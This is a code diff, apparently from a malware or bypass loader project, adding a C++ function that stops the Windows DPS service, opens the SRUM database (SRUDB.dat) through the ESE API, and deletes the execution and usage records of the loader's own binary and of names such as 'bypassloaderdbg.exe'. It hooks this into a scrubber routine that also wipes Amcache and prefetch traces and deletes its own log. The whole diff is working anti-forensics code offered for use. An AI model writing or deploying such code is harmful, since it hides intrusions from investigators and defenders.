@@ -612,6 +612,406 @@ inline bool ScrubAmcache() {
     return true;
 }
 
+// -- SRUM (SRUDB.dat) Forensic Scrubber ------------------------------------------
+// Removes loader execution records from SRUM database via dynamic ESE API calls.
+// Stops DPS service temporarily (with guaranteed restart), backs up database,
+// scrubs dependent usage tables, deletes SruDbIdMapTable identities, and commits.
+
+inline bool IsProcessElevated() {
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
+    TOKEN_ELEVATION elev{};
+    DWORD cbSize = sizeof(elev);
+    bool isElevated = false;
+    if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &cbSize)) {
+        isElevated = (elev.TokenIsElevated != 0);
+    }
+    CloseHandle(hToken);
+    return isElevated;
+}
+
+inline bool WaitServiceState(SC_HANDLE svc, DWORD target_state, DWORD timeout_ms) {
+    DWORD waited = 0;
+    SERVICE_STATUS_PROCESS ssp{};
+    DWORD bytes = 0;
+    while (waited < timeout_ms) {
+        if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytes)) {
+            return false;
+        }
+        if (ssp.dwCurrentState == target_state) return true;
+        Sleep(100);
+        waited += 100;
+    }
+    return false;
+}
+
+inline std::wstring ToDevicePathLower(const std::wstring& dos_path) {
+    if (dos_path.size() >= 2 && dos_path[1] == L':') {
+        wchar_t drive[3] = { dos_path[0], L':', L'\0' };
+        wchar_t dev[MAX_PATH]{};
+        if (QueryDosDeviceW(drive, dev, MAX_PATH)) {
+            std::wstring res = std::wstring(dev) + dos_path.substr(2);
+            return ToLower(res);
+        }
+    }
+    return ToLower(dos_path);
+}
+
+inline bool ParseCompositeId(const std::wstring& blob, std::wstring& out_name, SYSTEMTIME& out_st) {
+    // Format: !!name!yyyy/MM/dd:HH:mm:ss!hash!
+    if (blob.size() < 6 || blob[0] != L'!' || blob[1] != L'!') return false;
+    size_t first = 2;
+    size_t second = blob.find(L'!', first);
+    if (second == std::wstring::npos) return false;
+    out_name = blob.substr(first, second - first);
+
+    size_t third = blob.find(L'!', second + 1);
+    if (third == std::wstring::npos) return false;
+    std::wstring ts = blob.substr(second + 1, third - (second + 1));
+    if (ts.size() < 19) return false;
+
+    int y = 0, m = 0, d = 0, hr = 0, mn = 0, sc = 0;
+    if (swscanf_s(ts.c_str(), L"%d/%d/%d:%d:%d:%d", &y, &m, &d, &hr, &mn, &sc) != 6) return false;
+    ZeroMemory(&out_st, sizeof(out_st));
+    out_st.wYear = static_cast<WORD>(y);
+    out_st.wMonth = static_cast<WORD>(m);
+    out_st.wDay = static_cast<WORD>(d);
+    out_st.wHour = static_cast<WORD>(hr);
+    out_st.wMinute = static_cast<WORD>(mn);
+    out_st.wSecond = static_cast<WORD>(sc);
+    return true;
+}
+
+struct SrumEseFns {
+    JET_ERR (JET_API* JetCreateInstance2W)(JET_INSTANCE*, const wchar_t*, const wchar_t*, JET_GRBIT);
+    JET_ERR (JET_API* JetSetSystemParameterW)(JET_INSTANCE*, JET_SESID, unsigned long, JET_API_PTR, const wchar_t*);
+    JET_ERR (JET_API* JetInit)(JET_INSTANCE*);
+    JET_ERR (JET_API* JetBeginSessionW)(JET_INSTANCE, JET_SESID*, const wchar_t*, const wchar_t*);
+    JET_ERR (JET_API* JetAttachDatabaseW)(JET_SESID, const wchar_t*, JET_GRBIT);
+    JET_ERR (JET_API* JetOpenDatabaseW)(JET_SESID, const wchar_t*, const wchar_t*, JET_DBID*, JET_GRBIT);
+    JET_ERR (JET_API* JetBeginTransaction)(JET_SESID);
+    JET_ERR (JET_API* JetOpenTableW)(JET_SESID, JET_DBID, const wchar_t*, const void*, unsigned long, JET_GRBIT, JET_TABLEID*);
+    JET_ERR (JET_API* JetSetCurrentIndexW)(JET_SESID, JET_TABLEID, const wchar_t*);
+    JET_ERR (JET_API* JetGetTableColumnInfoW)(JET_SESID, JET_TABLEID, const wchar_t*, void*, unsigned long, unsigned long);
+    JET_ERR (JET_API* JetRetrieveColumn)(JET_SESID, JET_TABLEID, JET_COLUMNID, void*, unsigned long, unsigned long*, JET_GRBIT, JET_RETINFO*);
+    JET_ERR (JET_API* JetMove)(JET_SESID, JET_TABLEID, long, JET_GRBIT);
+    JET_ERR (JET_API* JetMakeKey)(JET_SESID, JET_TABLEID, const void*, unsigned long, JET_GRBIT);
+    JET_ERR (JET_API* JetSeek)(JET_SESID, JET_TABLEID, JET_GRBIT);
+    JET_ERR (JET_API* JetGetBookmark)(JET_SESID, JET_TABLEID, void*, unsigned long, unsigned long*);
+    JET_ERR (JET_API* JetGotoBookmark)(JET_SESID, JET_TABLEID, void*, unsigned long);
+    JET_ERR (JET_API* JetDelete)(JET_SESID, JET_TABLEID);
+    JET_ERR (JET_API* JetCommitTransaction)(JET_SESID, JET_GRBIT);
+    JET_ERR (JET_API* JetRollback)(JET_SESID, JET_GRBIT);
+    JET_ERR (JET_API* JetCloseTable)(JET_SESID, JET_TABLEID);
+    JET_ERR (JET_API* JetCloseDatabase)(JET_SESID, JET_DBID, JET_GRBIT);
+    JET_ERR (JET_API* JetDetachDatabaseW)(JET_SESID, const wchar_t*);
+    JET_ERR (JET_API* JetEndSession)(JET_SESID, JET_GRBIT);
+    JET_ERR (JET_API* JetTerm)(JET_INSTANCE);
+};
+
+inline bool ScrubSrum(bool all_times = false) {
+    if (!IsProcessElevated()) return false;
+    EnablePrivilege(SE_DEBUG_NAME);
+
+    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!scm) return false;
+    SC_HANDLE svc = OpenServiceW(scm, L"DPS", SERVICE_STOP | SERVICE_START | SERVICE_QUERY_STATUS);
+    if (!svc) {
+        CloseServiceHandle(scm);
+        return false;
+    }
+
+    SERVICE_STATUS_PROCESS ssp{};
+    DWORD bytes = 0;
+    if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytes)) {
+        CloseServiceHandle(svc);
+        CloseServiceHandle(scm);
+        return false;
+    }
+
+    bool dps_was_running = (ssp.dwCurrentState == SERVICE_RUNNING);
+    if (dps_was_running) {
+        SERVICE_STATUS st{};
+        ControlService(svc, SERVICE_CONTROL_STOP, &st);
+        if (!WaitServiceState(svc, SERVICE_STOPPED, 5000)) {
+            CloseServiceHandle(svc);
+            CloseServiceHandle(scm);
+            return false;
+        }
+    }
+
+    auto restart_dps = [&]() {
+        if (dps_was_running) {
+            StartServiceW(svc, 0, nullptr);
+            WaitServiceState(svc, SERVICE_RUNNING, 10000);
+        }
+        CloseServiceHandle(svc);
+        CloseServiceHandle(scm);
+    };
+
+    wchar_t sysroot[MAX_PATH]{};
+    if (!GetEnvironmentVariableW(L"SystemRoot", sysroot, MAX_PATH)) wcscpy_s(sysroot, L"C:\\Windows");
+    std::wstring db_path  = std::wstring(sysroot) + L"\\System32\\sru\\SRUDB.dat";
+    std::wstring jfm_path = std::wstring(sysroot) + L"\\System32\\sru\\SRUDB.jfm";
+
+    wchar_t temp_dir[MAX_PATH]{};
+    GetTempPathW(MAX_PATH, temp_dir);
+    std::wstring bak_db  = std::wstring(temp_dir) + L"srum_bak.dat";
+    std::wstring bak_jfm = std::wstring(temp_dir) + L"srum_bak.jfm";
+
+    CopyFileW(db_path.c_str(),  bak_db.c_str(),  FALSE);
+    CopyFileW(jfm_path.c_str(), bak_jfm.c_str(), FALSE);
+
+    HMODULE hEse = LoadLibraryW(L"esent.dll");
+    if (!hEse) {
+        restart_dps();
+        DeleteFileW(bak_db.c_str());
+        DeleteFileW(bak_jfm.c_str());
+        return false;
+    }
+
+    SrumEseFns ese{};
+    #define RESOLVE_ESE(fn) ese.fn = reinterpret_cast<decltype(ese.fn)>(GetProcAddress(hEse, #fn))
+    RESOLVE_ESE(JetCreateInstance2W);
+    RESOLVE_ESE(JetSetSystemParameterW);
+    RESOLVE_ESE(JetInit);
+    RESOLVE_ESE(JetBeginSessionW);
+    RESOLVE_ESE(JetAttachDatabaseW);
+    RESOLVE_ESE(JetOpenDatabaseW);
+    RESOLVE_ESE(JetBeginTransaction);
+    RESOLVE_ESE(JetOpenTableW);
+    RESOLVE_ESE(JetSetCurrentIndexW);
+    RESOLVE_ESE(JetGetTableColumnInfoW);
+    RESOLVE_ESE(JetRetrieveColumn);
+    RESOLVE_ESE(JetMove);
+    RESOLVE_ESE(JetMakeKey);
+    RESOLVE_ESE(JetSeek);
+    RESOLVE_ESE(JetGetBookmark);
+    RESOLVE_ESE(JetGotoBookmark);
+    RESOLVE_ESE(JetDelete);
+    RESOLVE_ESE(JetCommitTransaction);
+    RESOLVE_ESE(JetRollback);
+    RESOLVE_ESE(JetCloseTable);
+    RESOLVE_ESE(JetCloseDatabase);
+    RESOLVE_ESE(JetDetachDatabaseW);
+    RESOLVE_ESE(JetEndSession);
+    RESOLVE_ESE(JetTerm);
+    #undef RESOLVE_ESE
+
+    if (!ese.JetCreateInstance2W || !ese.JetInit || !ese.JetBeginSessionW || !ese.JetAttachDatabaseW ||
+        !ese.JetOpenDatabaseW || !ese.JetOpenTableW || !ese.JetRetrieveColumn || !ese.JetDelete ||
+        !ese.JetCommitTransaction || !ese.JetRollback || !ese.JetCloseTable || !ese.JetCloseDatabase ||
+        !ese.JetDetachDatabaseW || !ese.JetEndSession || !ese.JetTerm) {
+        FreeLibrary(hEse);
+        restart_dps();
+        DeleteFileW(bak_db.c_str());
+        DeleteFileW(bak_jfm.c_str());
+        return false;
+    }
+
+    JET_INSTANCE instance = 0;
+    JET_SESID sesid = 0;
+    JET_DBID dbid = 0;
+    bool ok = false;
+
+    do {
+        if (ese.JetCreateInstance2W(&instance, L"SrumScrubber", nullptr, 0) != JET_errSuccess) break;
+        ese.JetSetSystemParameterW(&instance, 0, JET_paramRecovery, 0, L"Off");
+        ese.JetSetSystemParameterW(&instance, 0, JET_paramCircularLog, 1, nullptr);
+        ese.JetSetSystemParameterW(&instance, 0, JET_paramTempPath, 0, temp_dir);
+
+        if (ese.JetInit(&instance) != JET_errSuccess) break;
+        if (ese.JetBeginSessionW(instance, &sesid, nullptr, nullptr) != JET_errSuccess) break;
+
+        if (ese.JetAttachDatabaseW(sesid, db_path.c_str(), 0) != JET_errSuccess) break;
+        if (ese.JetOpenDatabaseW(sesid, db_path.c_str(), nullptr, &dbid, 0) != JET_errSuccess) break;
+
+        if (ese.JetBeginTransaction(sesid) != JET_errSuccess) break;
+
+        JET_TABLEID mapTable = 0;
+        if (ese.JetOpenTableW(sesid, dbid, L"SruDbIdMapTable", nullptr, 0, 0, &mapTable) != JET_errSuccess) {
+            ese.JetRollback(sesid, 0);
+            break;
+        }
+
+        JET_COLUMNBASE_W colTypeInfo{}, colIndexInfo{}, colBlobInfo{};
+        ese.JetGetTableColumnInfoW(sesid, mapTable, L"IdType", &colTypeInfo, sizeof(colTypeInfo), JET_ColInfoBase);
+        ese.JetGetTableColumnInfoW(sesid, mapTable, L"IdIndex", &colIndexInfo, sizeof(colIndexInfo), JET_ColInfoBase);
+        ese.JetGetTableColumnInfoW(sesid, mapTable, L"IdBlob", &colBlobInfo, sizeof(colBlobInfo), JET_ColInfoBase);
+
+        struct MatchedIdentity {
+            int64_t id_index;
+            std::vector<uint8_t> bookmark;
+        };
+        std::vector<MatchedIdentity> matched;
+
+        std::wstring own_name_lower = ToLower(GetOwnExeName());
+        std::wstring own_dev_path_lower = ToDevicePathLower(GetOwnExePath());
+
+        std::vector<std::wstring> target_names = { own_name_lower, L"bypassloaderdbg.exe", L"runtimebroker.exe" };
+
+        FILETIME now_ft{};
+        GetSystemTimeAsFileTime(&now_ft);
+        ULARGE_INTEGER now_uli;
+        now_uli.LowPart = now_ft.dwLowDateTime;
+        now_uli.HighPart = now_ft.dwHighDateTime;
+
+        if (ese.JetMove(sesid, mapTable, JET_MoveFirst, 0) == JET_errSuccess) {
+            do {
+                uint8_t type_buf[8]{};
+                unsigned long type_act = 0;
+                ese.JetRetrieveColumn(sesid, mapTable, colTypeInfo.columnid, type_buf, sizeof(type_buf), &type_act, 0, nullptr);
+                int64_t id_type = 0;
+                if (type_act == 1) id_type = type_buf[0];
+                else if (type_act == 2) id_type = *reinterpret_cast<int16_t*>(type_buf);
+                else if (type_act == 4) id_type = *reinterpret_cast<int32_t*>(type_buf);
+
+                uint8_t blob_buf[2048]{};
+                unsigned long blob_act = 0;
+                ese.JetRetrieveColumn(sesid, mapTable, colBlobInfo.columnid, blob_buf, sizeof(blob_buf) - sizeof(wchar_t), &blob_act, 0, nullptr);
+                if (blob_act < sizeof(wchar_t)) continue;
+
+                std::wstring blob_str(reinterpret_cast<wchar_t*>(blob_buf), blob_act / sizeof(wchar_t));
+                std::wstring blob_lower = ToLower(blob_str);
+
+                bool match = false;
+                if (blob_lower.size() >= 2 && blob_lower[0] == L'!' && blob_lower[1] == L'!') {
+                    std::wstring comp_name;
+                    SYSTEMTIME comp_st{};
+                    if (ParseCompositeId(blob_str, comp_name, comp_st)) {
+                        std::wstring comp_lower = ToLower(comp_name);
+                        for (const auto& t : target_names) {
+                            if (comp_lower == t) {
+                                if (comp_lower == L"runtimebroker.exe" || comp_lower == L"svchost.exe") {
+                                    if (all_times) {
+                                        match = true;
+                                    } else {
+                                        FILETIME c_ft{};
+                                        SystemTimeToFileTime(&comp_st, &c_ft);
+                                        ULARGE_INTEGER c_uli;
+                                        c_uli.LowPart = c_ft.dwLowDateTime;
+                                        c_uli.HighPart = c_ft.dwHighDateTime;
+                                        int64_t diff = static_cast<int64_t>(now_uli.QuadPart) - static_cast<int64_t>(c_uli.QuadPart);
+                                        if (diff < 0) diff = -diff;
+                                        if (diff <= 9000000000ULL) {
+                                            match = true;
+                                        }
+                                    }
+                                } else {
+                                    match = true;
+                                }
+                                break;
+                            }
+                        }
+                    }
+                } else if (id_type == 0) {
+                    if (blob_lower.find(L"\\windows\\system32\\") == std::wstring::npos &&
+                        blob_lower.find(L"\\windows\\syswow64\\") == std::wstring::npos) {
+                        for (const auto& t : target_names) {
+                            if (blob_lower == own_dev_path_lower || blob_lower.find(t) != std::wstring::npos) {
+                                match = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if (match) {
+                    uint8_t idx_buf[8]{};
+                    unsigned long idx_act = 0;
+                    ese.JetRetrieveColumn(sesid, mapTable, colIndexInfo.columnid, idx_buf, sizeof(idx_buf), &idx_act, 0, nullptr);
+                    int64_t id_index = 0;
+                    if (idx_act == 1) id_index = idx_buf[0];
+                    else if (idx_act == 2) id_index = *reinterpret_cast<int16_t*>(idx_buf);
+                    else if (idx_act == 4) id_index = *reinterpret_cast<int32_t*>(idx_buf);
+                    else if (idx_act == 8) id_index = *reinterpret_cast<int64_t*>(idx_buf);
+
+                    uint8_t bm[JET_cbBookmarkMost]{};
+                    unsigned long bm_act = 0;
+                    if (ese.JetGetBookmark(sesid, mapTable, bm, sizeof(bm), &bm_act) == JET_errSuccess) {
+                        MatchedIdentity mid{};
+                        mid.id_index = id_index;
+                        mid.bookmark.assign(bm, bm + bm_act);
+                        matched.push_back(mid);
+                    }
+                }
+            } while (ese.JetMove(sesid, mapTable, JET_MoveNext, 0) == JET_errSuccess);
+        }
+
+        const wchar_t* usage_tables[] = {
+            L"{D10CA2FB-CF52-4148-B3E0-D07F7E663F00}", // AppResourceUsage
+            L"{D10CA2FC-CF52-4148-B3E0-D07F7E663F00}", // NetworkUsages
+            L"{5C8CF630-B29B-4D40-909C-65B59C21B381}", // AppTimeline
+            L"{FEE4E14F-02A9-4550-B5CE-5FA2DA202E37}", // NetworkConnectivity
+            L"{DA73FB10-3504-407F-A940-513060E777A4}"  // EnergyUsages
+        };
+
+        for (const auto* utbl : usage_tables) {
+            JET_TABLEID uTable = 0;
+            if (ese.JetOpenTableW(sesid, dbid, utbl, nullptr, 0, 0, &uTable) == JET_errSuccess) {
+                JET_COLUMNBASE_W colAppIdInfo{};
+                if (ese.JetGetTableColumnInfoW(sesid, uTable, L"AppId", &colAppIdInfo, sizeof(colAppIdInfo), JET_ColInfoBase) == JET_errSuccess) {
+                    if (ese.JetMove(sesid, uTable, JET_MoveFirst, 0) == JET_errSuccess) {
+                        do {
+                            uint8_t app_buf[8]{};
+                            unsigned long app_act = 0;
+                            ese.JetRetrieveColumn(sesid, uTable, colAppIdInfo.columnid, app_buf, sizeof(app_buf), &app_act, 0, nullptr);
+                            int64_t app_id = 0;
+                            if (app_act == 1) app_id = app_buf[0];
+                            else if (app_act == 2) app_id = *reinterpret_cast<int16_t*>(app_buf);
+                            else if (app_act == 4) app_id = *reinterpret_cast<int32_t*>(app_buf);
+                            else if (app_act == 8) app_id = *reinterpret_cast<int64_t*>(app_buf);
+
+                            for (const auto& m : matched) {
+                                if (app_id == m.id_index) {
+                                    ese.JetDelete(sesid, uTable);
+                                    break;
+                                }
+                            }
+                        } while (ese.JetMove(sesid, uTable, JET_MoveNext, 0) == JET_errSuccess);
+                    }
+                }
+                ese.JetCloseTable(sesid, uTable);
+            }
+        }
+
+        for (auto& m : matched) {
+            if (ese.JetGotoBookmark(sesid, mapTable, m.bookmark.data(), static_cast<unsigned long>(m.bookmark.size())) == JET_errSuccess) {
+                ese.JetDelete(sesid, mapTable);
+            }
+        }
+
+        ese.JetCloseTable(sesid, mapTable);
+
+        if (ese.JetCommitTransaction(sesid, 0) == JET_errSuccess) {
+            ok = true;
+        } else {
+            ese.JetRollback(sesid, 0);
+        }
+    } while (false);
+
+    if (dbid) ese.JetCloseDatabase(sesid, dbid, 0);
+    if (sesid) {
+        ese.JetDetachDatabaseW(sesid, db_path.c_str());
+        ese.JetEndSession(sesid, 0);
+    }
+    if (instance) ese.JetTerm(instance);
+
+    FreeLibrary(hEse);
+
+    if (!ok) {
+        CopyFileW(bak_db.c_str(),  db_path.c_str(),  FALSE);
+        CopyFileW(bak_jfm.c_str(), jfm_path.c_str(), FALSE);
+    }
+
+    restart_dps();
+    DeleteFileW(bak_db.c_str());
+    DeleteFileW(bak_jfm.c_str());
+
+    return ok;
+}
+
+
 // ── Scrubber Process Loop (P0 - T4) ─────────────────────────────────────────
 // Re-executes the same binary with "--scrub <parent_pid>". Waits for parent
 // to exit, allows SysMain to write the prefetch file, then purges all traces
@@ -668,6 +1068,9 @@ inline void ScrubberMain(DWORD parent_pid, const std::wstring& optional_log_path
 
     bool amc_ok = ScrubAmcache();
     log_step(L"Amcache", amc_ok);
+
+    bool srum_ok = ScrubSrum(false);
+    log_step(L"SRUM", srum_ok);
 
     if (!optional_log_path.empty() && std::filesystem::exists(optional_log_path)) {
         DeleteFileW(optional_log_path.c_str());
